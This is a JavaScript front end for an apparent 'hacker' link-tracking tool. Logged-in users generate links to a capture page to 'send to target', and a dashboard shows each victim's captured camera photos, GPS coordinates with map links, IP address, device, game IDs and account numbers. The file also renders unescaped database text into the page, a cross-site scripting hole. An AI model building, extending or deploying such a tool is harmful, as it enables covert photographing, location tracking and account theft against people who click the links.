const $ = (id) => document.getElementById(id);

let globalUser = null;
let selectedModule = null;
let toastTimer = null;

function toast(msg, type = '') {
    const t = $('toast');
    if (!t) return;
    t.textContent = msg;
    t.className = 'toast ' + type;
    clearTimeout(toastTimer);
    t.classList.remove('hidden');
    toastTimer = setTimeout(() => t.classList.add('hidden'), 3200);
}

(function initLockScreen() {
    const lockScreen = document.getElementById('lock-screen');
    const btnFollow = document.getElementById('btn-follow-channel');
    const btnUnlock = document.getElementById('btn-unlock-tool');
    const lockStatus = document.getElementById('lock-status');

    if (localStorage.getItem('tool_unlocked') === 'true') {
        lockScreen.classList.add('hidden-lock');
        setTimeout(() => { lockScreen.style.display = 'none'; }, 500);
        return;
    }

    btnFollow.addEventListener('click', function() {
        window.open('https://whatsapp.com/channel/0029VbB47ttDDmFNztpnZf2m', '_blank');
        lockStatus.className = 'lock-status checking';
        lockStatus.classList.remove('hidden');
        lockStatus.textContent = '✅ Channel opened! After following, click "I\'ve Followed — Unlock Tool" below.';
    });

    btnUnlock.addEventListener('click', function() {
        lockStatus.className = 'lock-status checking';
        lockStatus.classList.remove('hidden');
        lockStatus.textContent = '⏳ Verifying...';
        setTimeout(() => {
            localStorage.setItem('tool_unlocked', 'true');
            lockStatus.className = 'lock-status success';
            lockStatus.textContent = '✅ Tool Unlocked! Welcome Nawab Zada Hacker! 🦅';
            lockScreen.classList.add('hidden-lock');
            setTimeout(() => {
                lockScreen.style.display = 'none';
                toast('🔓 Tool Unlocked Successfully!', 'success');
            }, 500);
        }, 1000);
    });
})();

document.querySelectorAll('.nav-tab').forEach(tab => {
    tab.addEventListener('click', () => {
        document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
        tab.classList.add('active');
        document.querySelectorAll('.page-section').forEach(s => {
            s.classList.remove('active');
            s.style.display = 'none';
        });
        const target = document.getElementById('section-' + tab.dataset.section);
        if (target) {
            target.classList.add('active');
            target.style.display = 'block';
        }
    });
});

document.querySelectorAll('.page-section').forEach(s => {
    if (s.id !== 'section-home') s.style.display = 'none';
});
document.getElementById('section-home').style.display = 'block';

document.querySelectorAll('.module-card').forEach(card => {
    card.addEventListener('click', () => {
        document.querySelectorAll('.module-card').forEach(c => c.classList.remove('selected'));
        card.classList.add('selected');
        selectedModule = card.dataset.module;
        generateLink(selectedModule);
    });
});

let authMode = 'signup';
$('btn-login').addEventListener('click', () => $('auth-modal').classList.remove('hidden'));
$('btn-close-modal').addEventListener('click', () => $('auth-modal').classList.add('hidden'));

document.getElementById('auth-modal').addEventListener('click', (e) => {
    if (e.target === document.getElementById('auth-modal')) $('auth-modal').classList.add('hidden');
});

document.getElementById('auth-toggle').addEventListener('click', (e) => {
    e.preventDefault();
    authMode = authMode === 'login' ? 'signup' : 'login';
    document.getElementById('auth-title').textContent = authMode === 'login' ? 'Login' : 'Signup';
    document.getElementById('btn-auth-submit').textContent = authMode === 'login' ? 'Login' : 'Create Account';
    document.getElementById('auth-toggle').textContent = authMode === 'login' ? "Don't have account? Signup" : 'Already have account? Login';
});

document.getElementById('btn-auth-submit').addEventListener('click', async () => {
    const username = document.getElementById('auth-username').value.trim();
    const email = document.getElementById('auth-email').value.trim();
    const pass = document.getElementById('auth-pass').value;
    const errEl = document.getElementById('auth-error');
    errEl.classList.add('hidden');

    if (!email || !pass) {
        errEl.textContent = 'Email and password required';
        errEl.classList.remove('hidden');
        return;
    }
    if (authMode === 'signup' && !username) {
        errEl.textContent = 'Username required';
        errEl.classList.remove('hidden');
        return;
    }

    try {
        let userCreds;
        if (authMode === 'login') {
            userCreds = await auth.signInWithEmailAndPassword(email, pass);
        } else {
            userCreds = await auth.createUserWithEmailAndPassword(email, pass);
            let ip = '0.0.0.0';
            try {
                const r = await fetch('https://api.ipify.org?format=json');
                const d = await r.json();
                ip = d.ip;
            } catch(e) {}
            await db.collection('users').doc(userCreds.user.uid).set({
                username: username,
                email: email,
                registerIP: ip,
                deviceModel: navigator.userAgent.match(/Android/i) ? 'Android' : navigator.userAgent.match(/iPhone|iPad/i) ? 'iOS' : 'PC',
                linksGenerated: 0,
                createdAt: firebase.firestore.FieldValue.serverTimestamp()
            });
        }
        $('auth-modal').classList.add('hidden');
        toast(authMode === 'login' ? 'Login successful! ✅' : 'Account created! ✅', 'success');
    } catch (e) {
        errEl.textContent = e.message;
        errEl.classList.remove('hidden');
    }
});

$('btn-logout').addEventListener('click', () => auth.signOut());

async function deleteDashboardCapture(docId) {
    if (!confirm('⚠️ Delete this capture?')) return;
    try {
        await db.collection('captures').doc(docId).delete();
        toast('✅ Capture deleted!', 'success');
    } catch (e) {
        toast('❌ Error: ' + e.message, 'error');
    }
}

// Function to Save Image to Gallery
function saveToGallery(base64Str, filename = 'capture.jpg') {
    const link = document.createElement('a');
    link.href = base64Str;
    link.download = filename;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
}

auth.onAuthStateChanged(user => {
    globalUser = user;
    if (user) {
        $('btn-login').classList.add('hidden');
        $('btn-logout').classList.remove('hidden');
        db.collection('users').doc(user.uid).get().then(doc => {
            if (doc.exists) {
                $('nav-username').textContent = doc.data().username || 'User';
            } else {
                $('nav-username').textContent = user.email || 'User';
            }
        });
        loadDashboard(user.uid);
        loadTargets(user.uid);

        const adminTab = document.querySelector('[data-section="admin"]');
        if (adminTab) adminTab.style.display = '';
    } else {
        $('btn-login').classList.remove('hidden');
        $('btn-logout').classList.add('hidden');
        $('nav-username').textContent = 'Guest';
        $('camera-captures').innerHTML = '<p class="muted" style="text-align:center;padding:20px;">Login to view captures.</p>';
        $('location-captures').innerHTML = '<p class="muted" style="text-align:center;padding:20px;">Login to view captures.</p>';
        $('ip-traces').innerHTML = '<p class="muted" style="text-align:center;padding:20px;">Login to view captures.</p>';
        $('targets-list').innerHTML = '<p class="muted" style="text-align:center;padding:20px;">Login to see your links.</p>';
        const adminTab = document.querySelector('[data-section="admin"]');
        if (adminTab) adminTab.style.display = 'none';
    }
    loadReviews();
});

async function generateLink(type) {
    if (!globalUser) {
        toast('Please login first!', 'error');
        return;
    }
    const baseUrl = window.location.origin;
    let basePath = window.location.pathname.substring(0, window.location.pathname.lastIndexOf('/'));
    if (basePath === '') basePath = '';
    const capturePage = baseUrl + basePath + '/capture.html';

    try {
        const targetRef = await db.collection('targets').add({
            generatedBy: globalUser.uid,
            type: type,
            status: 'pending',
            createdAt: firebase.firestore.FieldValue.serverTimestamp()
        });

        try {
            const userRef = db.collection('users').doc(globalUser.uid);
            const userDoc = await userRef.get();
            const curLinks = userDoc.exists ? (userDoc.data().linksGenerated || 0) : 0;
            await userRef.set({ linksGenerated: curLinks + 1 }, { merge: true });
        } catch (e) {}

        const targetId = targetRef.id;
        const fullLink = `${capturePage}?id=${targetId}&type=${type}&uid=${globalUser.uid}`;
        $('generated-link').value = fullLink;
        $('link-generator').classList.remove('hidden');

        const badge = $('link-type-badge');
        badge.textContent = type === 'camera' ? '📷 CAMERA' : type === 'location' ? '📍 LOCATION' : '🌐 IP TRACE';
        badge.style.background = type === 'camera' ? 'rgba(59,130,246,.2)' : type === 'location' ? 'rgba(34,197,94,.2)' : 'rgba(168,85,247,.2)';
        badge.style.color = type === 'camera' ? '#93c5fd' : type === 'location' ? '#86efac' : '#c4a5f7';

        toast('✅ Link generated! Copy and send to target.', 'success');
        document.querySelector('[data-section="targets"]').click();
    } catch (error) {
        console.error('Link generation failed:', error);
        toast('❌ Link generation failed: ' + error.message, 'error');
    }
}

document.getElementById('btn-copy-link').addEventListener('click', function() {
    const linkInput = document.getElementById('generated-link');
    linkInput.select();
    linkInput.setSelectionRange(0, 99999);
    navigator.clipboard.writeText(linkInput.value).then(() => {
        toast('✅ Link copied to clipboard!', 'success');
    }).catch(() => {
        document.execCommand('copy');
        toast('✅ Link copied!', 'success');
    });
});

$('btn-new-link').addEventListener('click', () => {
    if (selectedModule) generateLink(selectedModule);
    else toast('Select a module first', 'error');
});

function base64ToImageSrc(base64) {
    if (!base64 || typeof base64 !== 'string') return '';
    if (base64.startsWith('data:')) return base64;
    return 'data:image/jpeg;base64,' + base64;
}

function loadDashboard(uid) {
    if (typeof db === 'undefined') return;

    db.collection('captures')
        .orderBy('timestamp', 'desc')
        .limit(100)
        .onSnapshot(snap => {
            let html = '';
            let count = 0;
            snap.forEach(d => {
                const c = d.data();
                if (c.uid !== uid) return;
                if (c.type !== 'camera') return;
                if (count >= 20) return;
                count++;

                const rawImg = c.photoBase64 || c.photoURL || '';
                const imgSrc = base64ToImageSrc(rawImg);
                
                html += `<div class="capture-item"> 
                    <div class="cap-time">${c.timestamp ? new Date(c.timestamp.toMillis()).toLocaleString() : 'Just now'}</div>`;
                
                if (imgSrc) {
                    html += `<img src="${imgSrc}" class="cap-img" onerror="this.style.display='none';this.nextElementSibling.style.display='block';">`;
                    html += `<p style="display:none;color:#fca5a5;font-size:12px;margin-top:4px;">📷 Photo available</p>`;
                } else {
                     html += `<div style="background:#14141f;border-radius:8px;padding:20px;text-align:center;margin:6px 0;"> <span style="font-size:28px;">📷</span> <p style="font-size:12px;color:#8a8aa5;margin-top:4px;">Photo captured (view in admin)</p> </div>`;
                }

                html += `<div class="cap-data"> 
                    <b>IP:</b> <span class="cap-ip">${c.ip || 'N/A'}</span> • ${c.deviceModel || ''} ${c.gamingId ? `<br><b>Game ID:</b> ${c.gamingId}` : ''} ${c.accountNumber ? `<br><b>Account:</b> ${c.accountNumber}` : ''} 
                    </div> 
                    <button onclick="deleteDashboardCapture('${d.id}')" style="background:rgba(239,68,68,.15);color:#ef4444;border:1px solid rgba(239,68,68,.3);padding:3px 10px;border-radius:8px;cursor:pointer;font-size:11px;font-weight:700;margin-top:6px;">🗑️ Delete</button>
                    ${imgSrc ? `<a href="${imgSrc}" download="capture_${Date.now()}.jpg" class="btn-save-gallery">💾 Save in Gallery</a>` : ''}
                </div>`;
            });
            $('camera-captures').innerHTML = html || '<p class="muted" style="text-align:center;padding:20px;">No camera captures yet.</p>';
        }, error => {
            console.error('Camera listener error:', error);
            $('camera-captures').innerHTML = '<p class="muted" style="text-align:center;padding:20px;color:#fca5a5;">⚠️ ' + error.message + '</p>';
        });

    db.collection('captures')
        .orderBy('timestamp', 'desc')
        .limit(100)
        .onSnapshot(snap => {
            let html = '';
            let count = 0;
            snap.forEach(d => {
                const c = d.data();
                if (c.uid !== uid) return;
                if (c.type !== 'location') return;
                if (count >= 20) return;
                count++;
                html += `<div class="capture-item"> 
                    <div class="cap-time">${c.timestamp ? new Date(c.timestamp.toMillis()).toLocaleString() : 'Just now'}</div> 
                    <div class="cap-data"> 
                        <b>📍 Location:</b> ${c.location || `${c.latitude}, ${c.longitude}`}<br> 
                        <b>IP:</b> <span class="cap-ip">${c.ip || 'N/A'}</span> • ${c.deviceModel || ''}<br> 
                        ${c.gamingId ? `<b>Game ID:</b> ${c.gamingId}<br>` : ''} ${c.accountNumber ? `<b>Account:</b> ${c.accountNumber}<br>` : ''} 
                        ${c.latitude ? `<a href="https://www.google.com/maps?q=${c.latitude},${c.longitude}" target="_blank" style="color:#3b82f6;font-size:12px;">🗺️ View on Google Maps</a>` : ''} 
                    </div> 
                    <button onclick="deleteDashboardCapture('${d.id}')" style="background:rgba(239,68,68,.15);color:#ef4444;border:1px solid rgba(239,68,68,.3);padding:3px 10px;border-radius:8px;cursor:pointer;font-size:11px;font-weight:700;margin-top:6px;">🗑️ Delete</button> 
                </div>`;
            });
            $('location-captures').innerHTML = html || '<p class="muted" style="text-align:center;padding:20px;">No location captures yet.</p>';
        }, error => {
            console.error('Location listener error:', error);
            $('location-captures').innerHTML = '<p class="muted" style="text-align:center;padding:20px;color:#fca5a5;">⚠️ ' + error.message + '</p>';
        });

    db.collection('captures')
        .orderBy('timestamp', 'desc')
        .limit(100)
        .onSnapshot(snap => {
            let html = '';
            let count = 0;
            snap.forEach(d => {
                const c = d.data();
                if (c.uid !== uid) return;
                if (c.type !== 'ip') return;
                if (count >= 20) return;
                count++;
                html += `<div class="capture-item"> 
                    <div class="cap-time">${c.timestamp ? new Date(c.timestamp.toMillis()).toLocaleString() : 'Just now'}</div> 
                    <div class="cap-data"> 
                        <b>🌐 IP:</b> <span class="cap-ip">${c.ip || 'N/A'}</span><br> 
                        <b>Device:</b> ${c.deviceModel || 'N/A'}<br> 
                        ${c.gamingId ? `<b>Game ID:</b> ${c.gamingId}<br>` : ''} ${c.accountNumber ? `<b>Account:</b> ${c.accountNumber}<br>` : ''} 
                    </div> 
                    <button onclick="deleteDashboardCapture('${d.id}')" style="background:rgba(239,68,68,.15);color:#ef4444;border:1px solid rgba(239,68,68,.3);padding:3px 10px;border-radius:8px;cursor:pointer;font-size:11px;font-weight:700;margin-top:6px;">🗑️ Delete</button> 
                </div>`;
            });
            $('ip-traces').innerHTML = html || '<p class="muted" style="text-align:center;padding:20px;">No IP traces yet.</p>';
        }, error => {
            console.error('IP listener error:', error);
            $('ip-traces').innerHTML = '<p class="muted" style="text-align:center;padding:20px;color:#fca5a5;">⚠️ ' + error.message + '</p>';
        });
}

function loadTargets(uid) {
    if (typeof db === 'undefined') return;
    db.collection('targets')
        .where('generatedBy', '==', uid)
        .orderBy('createdAt', 'desc')
        .limit(50)
        .onSnapshot(snap => {
            let html = '';
            snap.forEach(d => {
                const t = d.data();
                const status = t.status || 'pending';
                html += ` <div class="target-item"> 
                    <div> 
                        <span class="t-type ${t.type}">${(t.type || 'N/A').toUpperCase()}</span> 
                        <b style="margin-left:6px;">${t.status === 'hit' ? '✅' : '⏳'} ${status === 'hit' ? 'HIT' : 'PENDING'}</b> 
                        <div style="font-size:11px;color:var(--muted);margin-top:2px;"> ${t.createdAt ? new Date(t.createdAt.toMillis()).toLocaleString() : ''} ${t.ip ? `• 🌐 ${t.ip}` : ''} </div> 
                    </div> 
                    <div class="t-status ${status}"> ${status === 'hit' ? '🔴 Captured' : '⏳ Waiting...'} </div> 
                </div>`;
            });
            $('targets-list').innerHTML = html || '<p class="muted" style="text-align:center;padding:20px;">No links generated yet. Go to Home and select a module.</p>';
        }, error => {
            console.error('Targets listener error:', error);
            $('targets-list').innerHTML = '<p class="muted" style="text-align:center;padding:20px;color:#fca5a5;">⚠️ ' + error.message + '</p>';
        });
}

$('btn-submit-review').addEventListener('click', async () => {
    const name = $('review-name').value.trim() || 'Anonymous';
    const text = $('review-text').value.trim();
    if (!text) {
        toast('Please write a review', 'error');
        return;
    }
    try {
        await db.collection('reviews').add({
            name: name,
            text: text,
            uid: globalUser ? globalUser.uid : 'guest',
            createdAt: firebase.firestore.FieldValue.serverTimestamp()
        });
        toast('⭐ Review posted!', 'success');
        $('review-text').value = '';
    } catch (e) {
        toast('Error: ' + e.message, 'error');
    }
});

function loadReviews() {
    if (typeof db === 'undefined') return;
    db.collection('reviews').orderBy('createdAt', 'desc').limit(30).onSnapshot(snap => {
        let html = '';
        snap.forEach(d => {
            const r = d.data();
            html += ` <div class="review-card"> 
                <div class="reviewer">${r.name || 'Anonymous'}</div> 
                <div class="review-text">${r.text || ''}</div> 
                <div class="review-time">${r.createdAt ? new Date(r.createdAt.toMillis()).toLocaleString() : ''}</div> 
            </div>`;
        });
        $('reviews-container').innerHTML = html || '<p class="muted" style="text-align:center;padding:20px;">No reviews yet. Be the first!</p>';
    });
}
